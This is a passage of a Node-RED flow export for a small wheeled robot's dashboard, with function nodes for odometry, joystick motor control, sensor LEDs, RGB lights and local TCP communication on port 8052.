        "finalize": "",
        "libs": [],
        "x": 660,
        "y": 880,
        "wires": [
            [
                "1a7f4269b81e56a1"
            ]
        ]
    },
    {
        "id": "57b107b84bc1773b",
        "type": "function",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "func": "var m={\n    \"series\":[\"Voltage:\"],\n    \"data\":[[msg.payload.val[0]*0.015, msg.payload.val[1]*0.015]],\n    \"labels\":[\"Battery\",\"Auxiliary\"]\n};\nreturn {payload:[m]};\n/*\nvar m={\n    \"series\":[\"Voltage:\"],\n    \"data\":[[7.45, 0.0]],\n    \"labels\":[\"Battery\",\"Auxiliary\"]\n};\nreturn {payload:[m]};\n*/",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 660,
        "y": 640,
        "wires": [
            [
                "64d36d03c726fc51"
            ]
        ]
    },
    {
        "id": "744a3de27ebc6359",
        "type": "inject",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "Inject Sens Bump",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "{\"cmd\":\"bump\", \"val\":[false,true]}",
        "payloadType": "json",
        "x": 180,
        "y": 1460,
        "wires": [
            [
                "c26ce3f431702f38"
            ]
        ]
    },
    {
        "id": "9621403163627b20",
        "type": "function",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "func": "var l0, l1;\nl0 = Boolean(msg.payload.val[0]);\nl1 = Boolean(msg.payload.val[1]);\nreturn [{payload:l0}, {payload:l1}];\n//return [{payload:[m],topic:msg.topic}, {payload:[m],topic:msg.topic}];",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 660,
        "y": 920,
        "wires": [
            [
                "b54e9c77e53da413"
            ],
            [
                "84a03c715f6c289f"
            ]
        ]
    },
    {
        "id": "4079edf355144248",
        "type": "function",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "func": "const value = [];\nfor (let i = 0; i < 7; i++) {\n    if (msg.payload.val[i] < 32) {\n        value[i] = false;\n    } else {\n        value[i] = true;\n    }\n}\nreturn [{payload:value[0]}, {payload:value[1]}, {payload:value[2]}, {payload:value[3]}, {payload:value[4]}, {payload:value[5]}];",
        "outputs": 6,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 660,
        "y": 800,
        "wires": [
            [
                "37ea24c4643979e1"
            ],
            [
                "5507f78f0f11902d"
            ],
            [
                "6c23126a0d043ad2"
            ],
            [
                "e7922d966877c367"
            ],
            [
                "734d93e126320a50"
            ],
            [
                "8b9e2719062ead79"
            ]
        ]
    },
    {
        "id": "54b3da21c11695f7",
        "type": "link out",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "mode": "link",
        "links": [
            "b22ea59d78f5f53e",
            "03b1c028cb132d8c"
        ],
        "x": 495,
        "y": 1340,
        "wires": []
    },
    {
        "id": "a9c34ec6023fa193",
        "type": "function",
        "z": "5c3cf3d89dd2afb1",
        "name": "RGB",
        "func": "var RGB = (msg.payload.r<<16) | (msg.payload.g<<8) | (msg.payload.b);\n//msg.payload= \"SET L \" + RGB.toString() ;\nmsg.payload = {\"cmd\":\"ledR\",\"val\":RGB};\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 290,
        "y": 640,
        "wires": [
            [
                "e41c7b24d7fee001"
            ]
        ]
    },
    {
        "id": "b3b607fcfaf621bc",
        "type": "function",
        "z": "5c3cf3d89dd2afb1",
        "name": "RGB",
        "func": "var RGB = (msg.payload.r<<16) | (msg.payload.g<<8) | (msg.payload.b);\n//msg.payload= \"SET L \" + RGB.toString() ;\nmsg.payload = {\"cmd\":\"ledL\",\"val\":RGB};\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 290,
        "y": 560,
        "wires": [
            [
                "e41c7b24d7fee001"
            ]
        ]
    },
    {
        "id": "106cdfc9891c6541",
        "type": "debug",
        "z": "5c3cf3d89dd2afb1",
        "name": "debug",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 290,
        "y": 840,
        "wires": []
    },
    {
        "id": "fa75d43ef26e3596",
        "type": "link out",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "mode": "link",
        "links": [
            "b22ea59d78f5f53e",
            "03b1c028cb132d8c"
        ],
        "x": 895,
        "y": 1400,
        "wires": []
    },
    {
        "id": "f835af2b91efdd51",
        "type": "function",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "func": "var encL, encR;\nencL = msg.payload.val[0];\nencR = msg.payload.val[1];\nreturn [{payload:encL}, {payload:encR}];",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 660,
        "y": 960,
        "wires": [
            [
                "6036bf1b5010c492"
            ],
            [
                "e4d0bc2c7fd2e40d"
            ]
        ]
    },
    {
        "id": "e41c7b24d7fee001",
        "type": "json",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 430,
        "y": 560,
        "wires": [
            [
                "f86a2c310997bbee"
            ]
        ]
    },
    {
        "id": "c61bd894dafc6708",
        "type": "link in",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "links": [
            "c5183dbc8a6d12e1"
        ],
        "x": 155,
        "y": 680,
        "wires": [
            [
                "829ccc9aaf700b99"
            ]
        ]
    },
    {
        "id": "829ccc9aaf700b99",
        "type": "function",
        "z": "5c3cf3d89dd2afb1",
        "name": "Power Off",
        "func": "msg.payload = {\"cmd\":\"pdn\",\"val\":10000};\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 280,
        "y": 680,
        "wires": [
            [
                "e41c7b24d7fee001"
            ]
        ]
    },
    {
        "id": "d4c5af175d2f35c0",
        "type": "function",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "func": "var d = 92.0; // mm\nvar r = 20.0; // mm\nvar dt = 0.1; // sec\nvar ticks_per_rev = 692.0; // n\nvar sL, sR, s, phi; // mm, rad\nvar vL, vR, v, omega; // mm/s, rad/s\nvar dx, dy;\nvar encNewL, encNewR;\nvar encOldL, encOldR;\nvar encL, encR;\nvar xOld, yOld, tOld;\nvar xNew, yNew, tNew;\nencOldL = context.get('encOldL')||0;\nencOldR = context.get('encOldR')||0;\nxOld = context.get('xOld')||0;\nyOld = context.get('yOld')||0;\ntOld = context.get('tOld')||0;\nencNewL = msg.payload.val[0];\nencNewR = msg.payload.val[1];\n// displacement\nencL = encNewL - encOldL;\nencR = encNewR - encOldR;\nsL = 2 * Math.PI * r * encL / ticks_per_rev;\nsR = 2 * Math.PI * r * encR / ticks_per_rev;\ns = (sL + sR) / 2;\nphi = (sR - sL) / d;\n// speed\nvL = sL / dt;\nvR = sR / dt;\nv = s / dt;\n// speed in world\nphi += tOld;\ndx = Math.cos(phi) * v;\ndy = Math.sin(phi) * v;\n// position in world\nxNew = xOld + dx * dt;\nyNew = yOld + dy * dt;\ntNew = phi;\n// save old pose\ncontext.set('encOldL',encNewL);\ncontext.set('encOldR',encNewR);\ncontext.set('xOld',xNew);\ncontext.set('yOld',yNew);\ncontext.set('tOld',tNew);\nglobal.set('phi', phi);\n// answer\nif (xNew != xOld || yNew != yOld) {\n    msg.topic = \"add\"\n    msg.payload = {\"x\":Math.round(xNew),\"y\":Math.round(yNew),\"t\":tNew};\n    //msg.payload = {\"x\":Math.abs(Math.round(xNew)),\"y\":Math.abs(Math.round(yNew))};\n    return msg;\n}\n\n// www.youtube.com/watch?v=RZlZcDxQ8P4\n// F:/Work/DUE/Robot/Tananyag/Embedded%20Robotics%20-%20Thomas%20Braunl.pdf\n// https://en.wikipedia.org/wiki/Differential_wheeled_robot\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 660,
        "y": 1000,
        "wires": [
            [
                "b69c5129af8f7ec1"
            ]
        ]
    },
    {
        "id": "a20d455df852ef10",
        "type": "change",
        "z": "5c3cf3d89dd2afb1",
        "name": "random x/y",
        "rules": [
            {
                "t": "set",
                "p": "payload",
                "pt": "msg",
                "to": "(\t    $minimum := 1;\t    $maximum := 500;\t    $x := $round(($random() * ($maximum-$minimum)) + $minimum, 0);\t    $y := $round(($random() * ($maximum-$minimum)) + $minimum, 0);\t    {\t        \"x\": $x,\t        \"y\": $y\t    }\t)",
                "tot": "jsonata"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 930,
        "y": 1140,
        "wires": [
            [
                "b69c5129af8f7ec1"
            ]
        ]
    },
    {
        "id": "d27916fcd7be9013",
        "type": "link out",
        "z": "5c3cf3d89dd2afb1",
        "name": "link out 1",
        "mode": "link",
        "links": [
            "38f5967e58c51468"
        ],
        "x": 615,
        "y": 1040,
        "wires": []
    },
    {
        "id": "3a7085ab6bf39a3e",
        "type": "tcp in",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "server": "server",
        "host": "",
        "port": "8052",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "trim": false,
        "base64": false,
        "tls": "",
        "x": 140,
        "y": 280,
        "wires": [
            [
                "540c71150922d196",
                "c18fe004bdff8ffe",
                "b2478cbd7369927a",
                "2c785e0894b9bef4"
            ]
        ]
    },
    {
        "id": "38f5967e58c51468",
        "type": "link in",
        "z": "5c3cf3d89dd2afb1",
        "name": "link in 1",
        "links": [
            "d27916fcd7be9013"
        ],
        "x": 625,
        "y": 380,
        "wires": [
            [
                "75018eefece68cf2"
            ]
        ]
    },
    {
        "id": "d89cbdf15dbb70cb",
        "type": "function",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "",
        "func": "var d = 92.0; // mm\nvar r = 20.0; // mm\nvar dt = 0.1; // sec\nvar ticks_per_rev = 692.0; // n\nvar sL, sR, s, phi; // mm, rad\nvar vL, vR, v, omega; // mm/s, rad/s\nvar dx, dy;\nvar encNewL, encNewR;\nvar encOldL, encOldR;\nvar encL, encR;\nvar xOld, yOld, tOld;\nvar xNew, yNew, tNew;\nencOldL = context.get('encOldL') || 0;\nencOldR = context.get('encOldR') || 0;\nxOld = context.get('xOld') || 0;\nyOld = context.get('yOld') || 0;\ntOld = context.get('tOld') || 0;\nencNewL = msg.payload.val[0];\nencNewR = msg.payload.val[1];\n// displacement\nencL = encNewL - encOldL;\nencR = encNewR - encOldR;\nsL = 2 * Math.PI * r * encL / ticks_per_rev;\nsR = 2 * Math.PI * r * encR / ticks_per_rev;\ns = (sL + sR) / 2;\nphi = ((sR - sL) / d) * (180 / Math.PI);\nif (phi >= 135) { phi = 135; }\nif (phi <= -135) { phi = -135; }\nphi = Math.round(phi);\n//msg.payload = { \"phi\": \"phi\", \"val\": phi };\n//msg.payload = { \"val\": phi };\nmsg.payload = phi.toString();\nreturn msg;\n/*\n// speed\nvL = sL / dt;\nvR = sR / dt;\nv = s / dt;\n// speed in world\nphi += tOld;\ndx = Math.cos(phi) * v;\ndy = Math.sin(phi) * v;\n// position in world\nxNew = xOld + dx * dt;\nyNew = yOld + dy * dt;\ntNew = phi;\n// save old pose\ncontext.set('encOldL', encNewL);\ncontext.set('encOldR', encNewR);\ncontext.set('xOld', xNew);\ncontext.set('yOld', yNew);\ncontext.set('tOld', tNew);\n// answer\nif (xNew != xOld || yNew != yOld) {\n    msg.topic = \"add\"\n    msg.payload = { \"x\": Math.round(xNew), \"y\": Math.round(yNew), \"t\": tNew };\n    //msg.payload = {\"x\":Math.abs(Math.round(xNew)),\"y\":Math.abs(Math.round(yNew))};\n    return msg;\n}\n*/\n\n\n\n// www.youtube.com/watch?v=RZlZcDxQ8P4\n// F:/Work/DUE/Robot/Tananyag/Embedded%20Robotics%20-%20Thomas%20Braunl.pdf\n// https://en.wikipedia.org/wiki/Differential_wheeled_robot\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 930,
        "y": 380,
        "wires": [
            [
                "b2dafabdc0667353",
                "28523dd684710915"
            ]
        ]
    },
    {
        "id": "b2dafabdc0667353",
        "type": "debug",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "debug 4",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1090,
        "y": 380,
        "wires": []
    },
    {
        "id": "2c785e0894b9bef4",
        "type": "function",
        "z": "5c3cf3d89dd2afb1",
        "name": "Joystick",
        "func": "var intX;\n//msg.payload = msg.payload.toString('ascii');\n//return msg;\nintX = parseInt(msg.payload.toString('ascii'))/4;\n//var x = (msg.payload.vector.x || 0);\n//var y = (msg.payload.vector.y || 0);\n//var m = {};\n//x = Math.round(x*50);\n//y = Math.round(y*50);\n//m.cmd = \"go\";\n//m.dir = [x, y];\n//return {payload:m};\n\n//var desiredSpeed = msg.payload.dir[1];\n//var desiredDirection = msg.payload.dir[0];\n//speedRM = desiredSpeed - desiredDirection\n//speedLM = desiredSpeed + desiredDirection\nvar vRM = intX;\nvar vLM = -intX;\n//Arduino\nif (vRM >= 25) {vRM = 25;}\nif (vLM >= 25) {vLM = 25;}\nif (vRM <= -25) {vRM = -25;}\nif (vLM <= -25) {vLM = -25;}\n//msg.payload = \"SET MR 50\\n\" + \"SET ML 50\";\n//msg.payload = \"SET MR \" + vRM.toString() + \"\\n\" + \"SET ML \" + vLM.toString();\n//return msg;\nmsg.payload = {\"cmd\":\"mot\",\"val\":[vRM,vLM]};\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 340,
        "y": 340,
        "wires": [
            [
                "e41c7b24d7fee001"
            ]
        ]
    },
    {
        "id": "28523dd684710915",
        "type": "tcp out",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "",
        "host": "",
        "port": "8052",
        "beserver": "reply",
        "base64": false,
        "end": false,
        "tls": "",
        "x": 1090,
        "y": 340,
        "wires": []
    },
    {
        "id": "bb6507996789e92a",
        "type": "function",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "func": "var d = 92.0; // mm\nvar r = 20.0; // mm\nvar dt = 0.1; // sec\nvar ticks_per_rev = 692.0; // n\nvar sL, sR, s, phi; // mm, rad\nvar vL, vR, v, omega; // mm/s, rad/s\nvar dx, dy;\nvar encNewL, encNewR;\nvar encOldL, encOldR;\nvar encL, encR;\nvar xOld, yOld, tOld;\nvar xNew, yNew, tNew;\nencOldL = context.get('encOldL') || 0;\nencOldR = context.get('encOldR') || 0;\nxOld = context.get('xOld') || 0;\nyOld = context.get('yOld') || 0;\ntOld = context.get('tOld') || 0;\n//encNewL = msg.payload.val[0];\n//encNewR = msg.payload.val[1];\n// displacement\n\n\n\n\n//encL = encNewL - encOldL;\n//encR = encNewR - encOldR;\n\nencL = encOldL;\nencR = encOldR;\nsL = 2 * Math.PI * r * encL / ticks_per_rev;\nsR = 2 * Math.PI * r * encR / ticks_per_rev;\n\n\nphi = 30;\n\n//s = (sL + sR) / 2;\nphi = ((sR - sL) / d) * (180 / Math.PI);\n//msg.payload = { \"phi\": \"phi\", \"val\": phi };\n\nmsg.payload = phi.toString();\n\n//msg.payload = { \"val\": phi };\nreturn msg;\n\n\n\n\n\n\n/*\n// speed\nvL = sL / dt;\nvR = sR / dt;\nv = s / dt;\n// speed in world\nphi += tOld;\ndx = Math.cos(phi) * v;\ndy = Math.sin(phi) * v;\n// position in world\nxNew = xOld + dx * dt;\nyNew = yOld + dy * dt;\ntNew = phi;\n// save old pose\ncontext.set('encOldL', encNewL);\ncontext.set('encOldR', encNewR);\ncontext.set('xOld', xNew);\ncontext.set('yOld', yNew);\ncontext.set('tOld', tNew);\n// answer\nif (xNew != xOld || yNew != yOld) {\n    msg.topic = \"add\"\n    msg.payload = { \"x\": Math.round(xNew), \"y\": Math.round(yNew), \"t\": tNew };\n    //msg.payload = {\"x\":Math.abs(Math.round(xNew)),\"y\":Math.abs(Math.round(yNew))};\n    return msg;\n}\n*/\n\n\n\n// www.youtube.com/watch?v=RZlZcDxQ8P4\n// F:/Work/DUE/Robot/Tananyag/Embedded%20Robotics%20-%20Thomas%20Braunl.pdf\n// https://en.wikipedia.org/wiki/Differential_wheeled_robot\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 340,
        "y": 260,
        "wires": [
            [
                "5a6c4db282f02c24"
            ]
        ]
    },
    {
        "id": "5a6c4db282f02c24",
        "type": "debug",
        "z": "5c3cf3d89dd2afb1",
        "name": "debug 5",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 520,
        "y": 260,
        "wires": []
    },
    {
        "id": "75018eefece68cf2",
        "type": "delay",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "",
        "pauseType": "rate",
        "timeout": "5",
        "timeoutUnits": "seconds",
        "rate": "100",
        "nbRateUnits": "1",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": true,
        "allowrate": false,
        "outputs": 1,
        "x": 770,
        "y": 380,
        "wires": [
            [
                "d89cbdf15dbb70cb"
            ]
        ]
    },
    {
        "id": "540c71150922d196",
        "type": "trigger",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "op1": "",
        "op2": "0",
        "op1type": "nul",
        "op2type": "str",
        "duration": "500",
        "extend": true,
        "overrideDelay": false,
        "units": "ms",
        "reset": "",
        "bytopic": "all",
        "topic": "topic",
        "outputs": 1,
        "x": 160,
        "y": 340,
        "wires": [
            [
                "2c785e0894b9bef4"
            ]
        ]
    },
    {
        "id": "e5d1ccef500adf71",
        "type": "tcp out",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "host": "",
        "port": "8052",
        "beserver": "reply",
        "base64": false,
        "end": false,
        "tls": "",
        "x": 520,
        "y": 300,
        "wires": []
    },
    {
        "id": "c18fe004bdff8ffe",
        "type": "function",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "func": "// tOld\nvar phi;\nphi = global.get('phi') || 0;\nphi = -phi * (180 / Math.PI);\nif (phi >= 135) { phi = 135; }\nif (phi <= -135) { phi = -135; }\nphi = Math.round(phi);\n//msg.payload = { \"phi\": \"phi\", \"val\": phi };\n//msg.payload = { \"val\": phi };*/\nmsg.payload = phi.toString();\nreturn msg;\n/*\n// speed\nvL = sL / dt;\nvR = sR / dt;\nv = s / dt;\n// speed in world\nphi += tOld;\ndx = Math.cos(phi) * v;\ndy = Math.sin(phi) * v;\n// position in world\nxNew = xOld + dx * dt;\nyNew = yOld + dy * dt;\ntNew = phi;\n// save old pose\ncontext.set('encOldL', encNewL);\ncontext.set('encOldR', encNewR);\ncontext.set('xOld', xNew);\ncontext.set('yOld', yNew);\ncontext.set('tOld', tNew);\n// answer\nif (xNew != xOld || yNew != yOld) {\n    msg.topic = \"add\"\n    msg.payload = { \"x\": Math.round(xNew), \"y\": Math.round(yNew), \"t\": tNew };\n    //msg.payload = {\"x\":Math.abs(Math.round(xNew)),\"y\":Math.abs(Math.round(yNew))};\n    return msg;\n}\n*/\n\n\n\n// www.youtube.com/watch?v=RZlZcDxQ8P4\n// F:/Work/DUE/Robot/Tananyag/Embedded%20Robotics%20-%20Thomas%20Braunl.pdf\n// https://en.wikipedia.org/wiki/Differential_wheeled_robot\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 340,
        "y": 300,
        "wires": [
            [
                "0158d1d67635cbb6",
                "e5d1ccef500adf71"
            ]
        ]
    },
    {
        "id": "0158d1d67635cbb6",
        "type": "debug",
        "z": "5c3cf3d89dd2afb1",
        "name": "debug 6",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 520,
        "y": 340,
        "wires": []
    },
    {
        "id": "e619efa6a23a1b6c",
        "type": "delay",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "",
        "pauseType": "delay",
        "timeout": "500",
        "timeoutUnits": "milliseconds",
        "rate": "1",
        "nbRateUnits": "1",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": false,
        "allowrate": false,
        "outputs": 1,
        "x": 750,
        "y": 320,
        "wires": [
            []
        ]
    },
    {
        "id": "b2478cbd7369927a",
        "type": "debug",
        "z": "5c3cf3d89dd2afb1",
        "name": "debug 7",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 340,
        "y": 220,
        "wires": []
    },
    {
        "id": "b22ea59d78f5f53e",
        "type": "link in",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "links": [
            "54b3da21c11695f7",
            "fa75d43ef26e3596"
        ],
        "x": 175,
        "y": 840,
        "wires": [
            [
                "74b2b4b45add9f14"
            ]
        ]
    },
    {
        "id": "74b2b4b45add9f14",
        "type": "json",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 290,
        "y": 800,
        "wires": [
            [
                "c0bb8c528d811b1c"
            ]
        ]
    },
    {
        "id": "82bae11390729450",
        "type": "ui_joystick",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "group": "c86f4eb8832ef5e9",
        "order": 7,
        "width": 4,
        "height": 4,
        "trigger": "all",
        "timeInterval": "100",
        "useThemeColor": true,
        "color": "#000000",
        "threshold": 0.1,
        "directions": "all",
        "shape": "circle",
        "centerAtRelease": true,
        "x": 130,
        "y": 480,
        "wires": [
            [
                "48e217a30e1c1c02"
            ]
        ]
    },
    {
        "id": "37ea24c4643979e1",
        "type": "ui_led",
        "z": "5c3cf3d89dd2afb1",
        "order": 6,
        "group": "08d388c7e26378d4",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Cliff FL",
        "x": 820,
        "y": 780,
        "wires": []
    },
    {
        "id": "5507f78f0f11902d",
        "type": "ui_led",
        "z": "5c3cf3d89dd2afb1",
        "order": 7,
        "group": "08d388c7e26378d4",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Cliff FM",
        "x": 960,
        "y": 780,
        "wires": []
    },
    {
        "id": "6c23126a0d043ad2",
        "type": "ui_led",
        "z": "5c3cf3d89dd2afb1",
        "order": 8,
        "group": "08d388c7e26378d4",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Cliff FR",
        "x": 1100,
        "y": 780,
        "wires": []
    },
    {
        "id": "e7922d966877c367",
        "type": "ui_led",
        "z": "5c3cf3d89dd2afb1",
        "order": 10,
        "group": "08d388c7e26378d4",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Cliff RL",
        "x": 820,
        "y": 820,
        "wires": []
    },
    {
        "id": "734d93e126320a50",
        "type": "ui_led",
        "z": "5c3cf3d89dd2afb1",
        "order": 11,
        "group": "08d388c7e26378d4",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Cliff RM",
        "x": 960,
        "y": 820,
        "wires": []
    },
    {
        "id": "8b9e2719062ead79",
        "type": "ui_led",
        "z": "5c3cf3d89dd2afb1",
        "order": 12,
        "group": "08d388c7e26378d4",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Cliff RR",
        "x": 1100,
        "y": 820,
        "wires": []
    },
    {
        "id": "b54e9c77e53da413",
        "type": "ui_led",
        "z": "5c3cf3d89dd2afb1",
        "order": 2,
        "group": "08d388c7e26378d4",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Bump L",
        "x": 820,
        "y": 920,
        "wires": []
    },
    {
        "id": "84a03c715f6c289f",
        "type": "ui_led",
        "z": "5c3cf3d89dd2afb1",
        "order": 4,
        "group": "08d388c7e26378d4",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Bump R",
        "x": 960,
        "y": 920,
        "wires": []
    },
    {
        "id": "a7d5b7d64576dadb",
        "type": "ui_button",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "",
        "group": "42c277f062ba6187",
        "order": 2,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "Cliff Sen. Button",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "{\"cmd\":\"cliff\",\"val\":[1,1.5,2.5,2,3,1.2]}",
        "payloadType": "str",
        "topic": "",
        "topicType": "str",
        "x": 740,
        "y": 1380,
        "wires": [
            [
                "fa75d43ef26e3596"
            ]
        ]
    },
    {
        "id": "588159f7636b4901",
        "type": "ui_button",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "",
        "group": "42c277f062ba6187",
        "order": 3,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "Distance Button",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "{\"cmd\":\"dist\", \"val\":[0.8,1,1,0.8]}",
        "payloadType": "str",
        "topic": "",
        "topicType": "str",
        "x": 740,
        "y": 1420,
        "wires": [
            [
                "fa75d43ef26e3596"
            ]
        ]
    },
    {
        "id": "d1c0996aa7695607",
        "type": "ui_button",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "",
        "group": "42c277f062ba6187",
        "order": 4,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "Power Button",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "{\"cmd\":\"pwr\", \"val\":[5.4,5.6,1.1,1.2,1.3,1.4]}",
        "payloadType": "str",
        "topic": "",
        "topicType": "str",
        "x": 740,
        "y": 1340,
        "wires": [
            [
                "fa75d43ef26e3596"
            ]
        ]
    },
    {
        "id": "fe6659f6ad9a0a83",
        "type": "ui_button",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "",
        "group": "42c277f062ba6187",
        "order": 1,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "Bumper Button",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "{\"cmd\":\"bump\", \"val\":[false,true]}",
        "payloadType": "str",
        "topic": "",
        "topicType": "str",
        "x": 740,
        "y": 1460,
        "wires": [
            [
                "fa75d43ef26e3596"
            ]
        ]
    },
    {
        "id": "295977d8a88c0c92",
        "type": "ui_button",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "group": "5fa1e3b2c9358c39",
        "order": 3,
        "width": 3,
        "height": 1,
        "passthru": false,
        "label": "add",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "add",
        "topicType": "str",
        "x": 910,
        "y": 1100,
        "wires": [
            [
                "a20d455df852ef10"
            ]
        ]
    },
    {
        "id": "e29654d556555bba",
